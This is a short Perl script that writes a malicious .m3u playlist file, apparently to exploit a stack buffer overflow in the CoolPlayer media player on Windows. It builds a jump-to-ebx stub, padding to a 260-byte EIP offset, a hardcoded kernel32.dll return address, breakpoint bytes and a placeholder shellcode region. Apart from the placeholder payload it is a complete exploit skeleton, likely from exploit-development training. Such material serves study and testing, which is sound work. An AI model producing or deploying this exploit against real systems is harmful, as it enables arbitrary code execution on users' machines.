#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3; #add 300 to ebx
$jmp = $jmp . "\xff\xe3"; # jmp ebx
my $junk = "\x41" x (260 - length($jmp)); #offset to EIP
my $eip = pack("V", 0x7c810395); #call ebx from kernel32.dll

my $nops = "\xcc" x 50;
my $shell = "\x43" x 200;

my $sploit = $jmp.$junk.$eip.$nops.$shell; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayerjmpebx.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
